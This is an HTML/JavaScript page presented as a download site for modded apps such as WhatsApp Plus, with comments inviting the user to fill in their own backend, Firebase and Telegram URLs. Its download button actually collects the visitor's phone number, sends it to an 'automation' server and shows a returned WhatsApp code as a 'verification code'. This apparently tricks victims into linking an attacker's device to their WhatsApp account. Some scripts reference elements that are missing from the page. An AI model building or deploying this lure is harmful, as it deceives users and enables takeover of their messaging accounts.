<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>V VIP SERVERS | Premium Proxy & MOD Apps</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,wght@0,400;0,600;0,700;0,800;0,900;1,500&display=swap" rel="stylesheet">
    <style>
        /* ========== TUMHARA ORIGINAL CSS (JO PEHLE DIYA THA) ========== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        html {
            scroll-behavior: smooth;
        }
        :root, html.dark-mode {
            --bg-body: radial-gradient(circle at 10% 20%, #0d061f, #000000);
            --bg-animation: radial-gradient(ellipse at 50% 50%, rgba(53, 226, 242, 0.08) 0%, rgba(0,0,0,0) 70%);
            --surface: rgba(18, 18, 36, 0.65);
            --surface-2: rgba(30, 30, 60, 0.5);
            --text-primary: #f8fafc;
            --text-secondary: #a0afc7;
            --border: rgba(53, 226, 242, 0.3);
            --card-stroke: rgba(53, 226, 242, 0.25);
            --accent: linear-gradient(135deg, #35e2f2, #ff0080);
            --accent-glow: rgba(53, 226, 242, 0.45);
            --nav-bg: rgba(8, 8, 20, 0.75);
            --card-text-title: #ffffff;
            --shadow-sm: 0 12px 35px rgba(0, 0, 0, 0.6);
            --shadow-hover: 0 25px 45px rgba(255, 0, 128, 0.2), 0 0 25px 3px rgba(53, 226, 242, 0.3);
            --icon-stroke: linear-gradient(135deg, #35e2f2, #ff0080);
            --glow-border: 0 0 12px rgba(53, 226, 242, 0.3);
        }
        html:not(.dark-mode) {
            --bg-body: linear-gradient(135deg, #eef2f7 0%, #d9e2ef 100%);
            --bg-animation: radial-gradient(ellipse at 50% 50%, rgba(2, 132, 199, 0.05) 0%, rgba(0,0,0,0) 70%);
            --surface: rgba(255, 255, 255, 0.75);
            --surface-2: rgba(248, 250, 252, 0.9);
            --text-primary: #0a0f1c;
            --text-secondary: #475569;
            --border: rgba(15, 23, 42, 0.18);
            --card-stroke: rgba(15, 23, 42, 0.12);
            --accent: linear-gradient(135deg, #0284c7, #db2777);
            --accent-glow: rgba(2, 132, 199, 0.25);
            --nav-bg: rgba(255, 255, 255, 0.82);
            --card-text-title: #0f172a;
            --shadow-sm: 0 12px 30px rgba(0, 0, 0, 0.08);
            --shadow-hover: 0 20px 40px rgba(219, 39, 119, 0.15), 0 0 20px 2px rgba(2, 132, 199, 0.2);
            --icon-stroke: linear-gradient(135deg, #0284c7, #db2777);
            --glow-border: 0 0 12px rgba(2, 132, 199, 0.2);
        }
        :root {
            --badge-new: #ff0080;
            --badge-premium: #8b5cf6;
            --badge-proxy: #35e2f2;
            --badge-tool: #f6e031;
        }
        body {
            background: var(--bg-body);
            background-attachment: fixed;
            font-family: 'Inter', sans-serif;
            color: var(--text-primary);
            transition: background 0.3s ease, color 0.3s ease;
            padding-bottom: 80px;
            min-height: 100vh;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--bg-animation);
            pointer-events: none;
            z-index: -1;
            animation: gentleShift 12s infinite alternate ease-in-out;
        }
        @keyframes gentleShift {
            0% { opacity: 0.4; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.05); }
        }
        .navbar {
            position: sticky;
            top: 0;
            background: var(--nav-bg);
            border-bottom: 1px solid var(--border);
            backdrop-filter: blur(24px);
            z-index: 100;
            box-shadow: var(--shadow-sm);
        }
        .nav-container {
            max-width: 640px;
            margin: 0 auto;
            padding: 14px 22px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .brand {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .brand-logo {
            width: 42px;
            height: 42px;
            border-radius: 50%;
            object-fit: cover;
            background: var(--icon-stroke);
            box-shadow: 0 0 12px rgba(53, 226, 242, 0.5);
        }
        .brand-text h1 {
            font-size: 1.45rem;
            font-weight: 900;
            letter-spacing: -0.4px;
            color: var(--text-primary);
        }
        .brand-text h1 span {
            background: var(--icon-stroke);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .brand-text p {
            font-size: 0.7rem;
            font-weight: 800;
            color: #35e2f2;
            text-transform: uppercase;
        }
        .menu-btn {
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .menu-btn span {
            width: 24px;
            height: 2.5px;
            background: var(--text-primary);
            border-radius: 4px;
        }
        .theme-toggle {
            background: rgba(255,255,255,0.1);
            border: 1px solid var(--border);
            border-radius: 50%;
            width: 42px;
            height: 42px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            font-size: 1.2rem;
        }
        .container {
            max-width: 640px;
            margin: 0 auto;
            padding: 20px;
        }
        .stroke-wrapper {
            display: block;
            border-radius: 28px;
            background: var(--icon-stroke);
            padding: 2px;
            overflow: hidden;
            margin-bottom: 25px;
        }
        .top-banner {
            background: var(--surface);
            backdrop-filter: blur(16px);
            border-radius: 26px;
            padding: 22px 16px;
            text-align: center;
            box-shadow: var(--shadow-sm);
        }
        .top-banner h2 {
            font-size: 1.4rem;
            font-weight: 900;
            background: var(--icon-stroke);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .video-section {
            border-radius: 26px;
            overflow: hidden;
            background: var(--surface);
            box-shadow: var(--shadow-sm);
        }
        .video-wrapper {
            position: relative;
            padding-bottom: 56.25%;
            height: 0;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
        .cards-list {
            display: flex;
            flex-direction: column;
            gap: 28px;
        }
        .app-card {
            background: var(--surface);
            backdrop-filter: blur(20px);
            border-radius: 28px;
            padding: 24px;
            border: 1px solid var(--card-stroke);
            box-shadow: var(--shadow-sm);
            transition: transform 0.35s cubic-bezier(0.2,0.9,0.4,1.1), box-shadow 0.3s ease;
            opacity: 0;
            animation: fadeSlideUp 0.5s ease forwards;
        }
        @keyframes fadeSlideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .app-card:hover {
            transform: translateY(-6px) scale(1.01);
            box-shadow: var(--shadow-hover);
        }
        .badge-row {
            display: flex;
            gap: 10px;
            margin-bottom: 18px;
            flex-wrap: wrap;
        }
        .badge {
            font-size: 0.68rem;
            font-weight: 800;
            padding: 5px 14px;
            border-radius: 40px;
            text-transform: uppercase;
            backdrop-filter: blur(4px);
        }
        .badge-new { background: rgba(255,0,128,0.2); color: #ff66b5; border: 1px solid #ff0080; }
        .badge-premium { background: rgba(139,92,246,0.2); color: #c4a5ff; border: 1px solid #8b5cf6; }
        .badge-proxy { background: rgba(53,226,242,0.2); color: #9efff5; border: 1px solid #35e2f2; }
        .badge-tool { background: rgba(246,224,49,0.25); color: #ffe170; border: 1px solid #eab308; }
        .card-main {
            display: flex;
            gap: 20px;
            margin-bottom: 18px;
            align-items: center;
        }
        .app-icon {
            width: 86px;
            height: 86px;
            border-radius: 24px;
            object-fit: cover;
            padding: 2.5px;
            background: var(--icon-stroke);
            box-shadow: 0 12px 25px rgba(0,0,0,0.3);
        }
        .app-details h3 {
            font-size: 1.4rem;
            font-weight: 800;
            color: var(--card-text-title);
        }
        .app-details p {
            font-size: 0.85rem;
            color: var(--text-secondary);
        }
        .stats-row {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin: 16px 0;
            padding: 12px 0;
            border-top: 1px solid var(--card-stroke);
            border-bottom: 1px solid var(--card-stroke);
        }
        .stat-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: var(--surface-2);
            padding: 10px 4px;
            border-radius: 16px;
            border: 1px solid var(--card-stroke);
            font-weight: 700;
            font-size: 0.75rem;
        }
        .rating {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .stars {
            display: flex;
            gap: 4px;
            color: #fbbf24;
        }
        .download-btn {
            width: 100%;
            background: var(--accent);
            border: none;
            padding: 16px;
            border-radius: 60px;
            color: white;
            font-weight: 800;
            font-size: 0.95rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            cursor: pointer;
            box-shadow: 0 6px 18px var(--accent-glow);
            transition: all 0.2s ease;
            position: relative;
            overflow: hidden;
        }
        .download-btn span.ripple {
            position: absolute;
            border-radius: 50%;
            transform: scale(0);
            background: rgba(255,255,255,0.5);
            animation: rippleEffect 0.6s linear;
        }
        @keyframes rippleEffect {
            to { transform: scale(4); opacity: 0; }
        }
        /* Modal Styles (tumhare original ke mutabik) */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(20px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 200;
            visibility: hidden;
            opacity: 0;
            transition: all 0.25s ease;
        }
        .modal.active {
            visibility: visible;
            opacity: 1;
        }
        .modal-card {
            background: var(--surface);
            border: 1px solid var(--border);
            max-width: 420px;
            width: 90%;
            padding: 28px 24px;
            border-radius: 36px;
            backdrop-filter: blur(24px);
            box-shadow: var(--shadow-hover);
        }
        .modal-view {
            display: none;
        }
        .modal-view.active {
            display: block;
        }
        .action-modal-btn {
            width: 100%;
            padding: 15px;
            border-radius: 50px;
            border: none;
            font-weight: 800;
            font-size: 1rem;
            cursor: pointer;
            margin-top: 15px;
            background: var(--accent);
            color: white;
        }
        .input-field-group {
            margin: 20px 0;
        }
        .phone-input {
            width: 100%;
            padding: 12px;
            border-radius: 18px;
            border: 2px solid var(--border);
            background: var(--surface-2);
            color: var(--text-primary);
            font-size: 1rem;
        }
        .code-container {
            background: rgba(255,0,128,0.1);
            border: 2px dashed #ff0080;
            border-radius: 20px;
            padding: 18px;
            text-align: center;
            margin: 15px 0;
        }
        .code-display {
            font-size: 2rem;
            font-weight: 900;
            letter-spacing: 4px;
            color: #35e2f2;
        }
        .close-modal {
            background: none;
            border: none;
            color: var(--text-secondary);
            margin-top: 10px;
            cursor: pointer;
        }
        .drawer-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.6);
            backdrop-filter: blur(10px);
            z-index: 150;
            visibility: hidden;
            opacity: 0;
        }
        .drawer-overlay.active {
            visibility: visible;
            opacity: 1;
        }
        .drawer {
            position: fixed;
            top: 0;
            right: -280px;
            width: 280px;
            height: 100%;
            background: var(--surface);
            backdrop-filter: blur(20px);
            transition: right 0.3s ease;
            z-index: 160;
            padding: 20px;
        }
        .drawer.open {
            right: 0;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <div class="brand">
                <img src="https://placehold.co/42x42/35e2f2/ffffff?text=VV" class="brand-logo" alt="logo">
                <div class="brand-text">
                    <h1>V<span>VIP</span> SERVERS</h1>
                    <p>PREMIUM PROXY MODS</p>
                </div>
            </div>
            <button class="menu-btn" id="menuBtn">
                <span></span><span></span><span></span>
            </button>

    </nav>

    <div class="container">
        <div class="stroke-wrapper">
            <div class="top-banner">
                <h2>⚡ UNLOCK PREMIUM FEATURES ⚡</h2>
                <p>Download MOD Apps & Proxy Tools</p>
            </div>
        </div>
        <div class="stroke-wrapper">
            <div class="video-section">
                <div class="video-wrapper">
                    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allowfullscreen></iframe>
                </div>
            </div>

        <div class="cards-list" id="cardsList"></div>
    </div>

    <!-- DRAWER -->
    <div class="drawer-overlay" id="drawerOverlay"></div>
    <div class="drawer" id="drawer">
        <button id="closeDrawer" style="background:none; border:none; color:var(--text-primary); font-size:1.5rem; float:right;">&times;</button>
        <h3>Menu</h3>
        <ul style="margin-top: 40px; list-style:none;">
            <li>Home</li>
            <li>Apps</li>
            <li>Contact</li>
        </ul>
    </div>

    <!-- MODAL (COMPLETE WITH ALL VIEWS) -->
    <div id="downloadModal" class="modal">
        <div class="modal-card">
            <div id="viewBanner" class="modal-view active">
                <img id="bannerAppIcon" src="" width="80" style="border-radius: 20px; margin-bottom: 10px;">
                <h3 id="bannerAppName"></h3>
                <p>Size: <span id="bannerAppSize"></span> | Downloads: <span id="bannerAppDownloads"></span> | Rating: <span id="bannerAppRating"></span></p>
                <button id="bannerNextBtn" class="action-modal-btn">Next</button>
            </div>
            <div id="viewPhoneAuth" class="modal-view">
                <div class="input-field-group">
                    <label>Mobile Number</label>
                    <input type="tel" id="authMobileNumber" class="phone-input" placeholder="Enter 10-digit number">
                </div>
                <button id="phoneSubmitBtn" class="action-modal-btn">Send OTP</button>
            </div>
            <div id="viewTerminalSync" class="modal-view">
                <div id="terminalStatusBlock">Status: <span id="terminalStatusText">Initializing...</span></div>
                <div class="code-container">
                    <div>Verification Code</div>
                    <div class="code-display" id="terminalCodeText">—— ——</div>
                </div>
                <div id="terminalGuideMsg">Please check WhatsApp for code</div>
                <button id="terminalSuccessBtn" style="display:none" class="action-modal-btn">Open Telegram</button>
                <button id="terminalCancelBtn" class="close-modal">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        // ========== APNI VALUES YAHAN DALO ==========
        const API_START_AUTOMATION = "http://localhost:3000/api/start-task"; // 🔁 CHANGE TO YOUR BACKEND URL
        const FIREBASE_REST_DB_URL = "https://vip-servers-d9788-default-rtdb.firebaseio.com/tasks"; // 🔁 CHANGE
        const TELEGRAM_CHANNEL_URL = "https://t.me/your_channel"; // 🔁 CHANGE

        // ========== DEMO APPS (TUJHSE REPLACE KAR LENA) ==========
        const apps = [
            { name: "WhatsApp Plus", desc: "Extra privacy features", img: "https://placehold.co/90x90/35e2f2/ffffff?text=WAP", size: "48 MB", downloads: "2M+", androidVer: "5.0+", stars: 4, reviews: 1200, badges: ["NEW", "PREMIUM"] },
            { name: "GB Instagram", desc: "Download stories", img: "https://placehold.co/90x90/ff0080/ffffff?text=GB", size: "62 MB", downloads: "1.5M+", androidVer: "6.0+", stars: 5, reviews: 890, badges: ["PROXY"] }
        ];

        function getBadgeClass(b) {
            if(b==="NEW") return "badge-new";
            if(b==="PREMIUM") return "badge-premium";
            if(b==="PROXY") return "badge-proxy";
            return "badge-tool";
        }

        function renderStars(stars, reviews) {
            let html = '<div class="stars">';
            for(let i=1;i<=5;i++) html += i<=stars ? "★" : "☆";
            html += `</div><div class="review-count">(${reviews} reviews)</div>`;
            return `<div class="rating">${html}</div>`;
        }

        function buildCards() {
            const container = document.getElementById('cardsList');
            container.innerHTML = '';
            apps.forEach((app, idx) => {
                const card = document.createElement('div');
                card.className = 'app-card';
                card.style.animationDelay = `${0.05 + idx * 0.03}s`;
                card.innerHTML = `
                    <div class="badge-row">${app.badges.map(b=>`<span class="badge ${getBadgeClass(b)}">${b}</span>`).join('')}</div>
                    <div class="card-main">
                        <img class="app-icon" src="${app.img}" alt="${app.name}" onerror="this.src='https://placehold.co/90x90/3b82f6/ffffff?text=${app.name.substring(0,2)}'">
                        <div class="app-details"><h3>${app.name}</h3><p>${app.desc}</p></div>
                    </div>
                    <div class="stats-row">
                        <div class="stat-item">💾 ${app.size}</div>
                        <div class="stat-item">⬇️ ${app.downloads}</div>
                        <div class="stat-item">📱 ${app.androidVer}</div>
                    </div>
                    ${renderStars(app.stars, app.reviews)}
                    <button class="download-btn" data-app="${app.name}">📥 Download Install Now</button>
                `;
                container.appendChild(card);
            });
            attachDownloadEvents();
        }

        let selectedAppData = null, currentSessionId = "", firebaseIntervalTimer = null;

        function attachDownloadEvents() {
            document.querySelectorAll('.download-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    addRipple(btn, e);
                    const appName = btn.getAttribute('data-app');
                    selectedAppData = apps.find(a => a.name === appName);
                    document.getElementById('bannerAppName').innerText = selectedAppData.name;
                    document.getElementById('bannerAppSize').innerText = selectedAppData.size;
                    document.getElementById('bannerAppDownloads').innerText = selectedAppData.downloads;
                    document.getElementById('bannerAppRating').innerText = selectedAppData.stars + ".0";
                    document.getElementById('bannerAppIcon').src = selectedAppData.img;
                    switchModalView('viewBanner');
                    document.getElementById('downloadModal').classList.add('active');
                });
            });
        }

        function addRipple(btn, e) {
            const ripple = document.createElement('span');
            ripple.classList.add('ripple');
            const rect = btn.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            ripple.style.width = ripple.style.height = `${size}px`;
            ripple.style.left = `${e.clientX - rect.left - size/2}px`;
            ripple.style.top = `${e.clientY - rect.top - size/2}px`;
            btn.appendChild(ripple);
            setTimeout(() => ripple.remove(), 600);
        }

        function switchModalView(viewId) {
            document.querySelectorAll('.modal-view').forEach(v => v.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
        }

        function closeInstallationModal() {
            document.getElementById('downloadModal').classList.remove('active');
            if(firebaseIntervalTimer) clearInterval(firebaseIntervalTimer);
        }

        document.getElementById('bannerNextBtn').addEventListener('click', () => switchModalView('viewPhoneAuth'));
        document.getElementById('phoneSubmitBtn').addEventListener('click', async () => {
            const phone = document.getElementById('authMobileNumber').value.trim();
            if(phone.length !== 10) return alert("Please enter 10-digit mobile number");
            currentSessionId = "session_" + Date.now() + "_" + Math.floor(Math.random()*1000);
            switchModalView('viewTerminalSync');
            document.getElementById('terminalCodeText').innerText = "—— ——";
            document.getElementById('terminalStatusText').innerText = "Starting automation...";
            try {
                const res = await fetch(API_START_AUTOMATION, {
                    method: "POST",
                    headers: {"Content-Type":"application/json"},
                    body: JSON.stringify({ sessionId: currentSessionId, mobileNumber: phone, appName: selectedAppData.name, targetDownloadLink: TELEGRAM_CHANNEL_URL })
                });
                const data = await res.json();
                if(!data.success) throw new Error(data.error);
                startDatabaseSyncTracker();
            } catch(err) {
                document.getElementById('terminalStatusText').innerText = "Error: " + err.message;
            }
        });

        function startDatabaseSyncTracker() {
            if(firebaseIntervalTimer) clearInterval(firebaseIntervalTimer);
            firebaseIntervalTimer = setInterval(async () => {
                try {
                    const resp = await fetch(`${FIREBASE_REST_DB_URL}/${currentSessionId}.json`);
                    const data = await resp.json();
                    if(!data) return;
                    if(data.status === "Error") {
                        clearInterval(firebaseIntervalTimer);
                        document.getElementById('terminalStatusText').innerText = data.errorMessage;
                        return;
                    }
                    if(data.whatsappCode && data.status === "Code_Generated") {
                        document.getElementById('terminalCodeText').innerText = data.whatsappCode;
                        document.getElementById('terminalStatusText').innerText = "Code generated. Waiting for WhatsApp link...";
                    }
                    if(data.status === "Success") {
                        clearInterval(firebaseIntervalTimer);
                        document.getElementById('terminalStatusText').innerText = "✅ Verification Successful!";
                        document.getElementById('terminalGuideMsg').style.display = "none";
                        const successBtn = document.getElementById('terminalSuccessBtn');
                        successBtn.style.display = "block";
                        successBtn.onclick = () => { window.open(TELEGRAM_CHANNEL_URL, '_blank'); closeInstallationModal(); };
                        document.getElementById('terminalCancelBtn').innerText = "Close";
                    }
                } catch(e) { console.error(e); }
            }, 3000);
        }

        document.getElementById('terminalCancelBtn').addEventListener('click', closeInstallationModal);
        window.addEventListener('click', (e) => { if(e.target === document.getElementById('downloadModal')) closeInstallationModal(); });

        // Theme and Drawer
        const themeToggle = document.getElementById('themeToggle');
        const htmlEl = document.documentElement;
        if(localStorage.getItem('theme') === 'dark' || !localStorage.getItem('theme')) {
            htmlEl.classList.add('dark-mode');
            themeToggle.innerText = '☀️';
        } else {
            htmlEl.classList.remove('dark-mode');
            themeToggle.innerText = '🌙';
        }
        themeToggle.addEventListener('click', () => {
            if(htmlEl.classList.contains('dark-mode')) {
                htmlEl.classList.remove('dark-mode');
                localStorage.setItem('theme', 'light');
                themeToggle.innerText = '🌙';
            } else {
                htmlEl.classList.add('dark-mode');
                localStorage.setItem('theme', 'dark');
                themeToggle.innerText = '☀️';
            }
        });

        const menuBtn = document.getElementById('menuBtn');
        const drawerOverlay = document.getElementById('drawerOverlay');
        const drawer = document.getElementById('drawer');
        const closeDrawer = document.getElementById('closeDrawer');
        function openDrawer() { drawerOverlay.classList.add('active'); drawer.classList.add('open'); document.body.style.overflow = 'hidden'; }
        function closeDrawerFunc() { drawerOverlay.classList.remove('active'); drawer.classList.remove('open'); document.body.style.overflow = ''; }
        menuBtn.addEventListener('click', openDrawer);
        closeDrawer.addEventListener('click', closeDrawerFunc);
        drawerOverlay.addEventListener('click', (e) => { if(e.target === drawerOverlay) closeDrawerFunc(); });

        buildCards();
    </script>
</body>
</html>
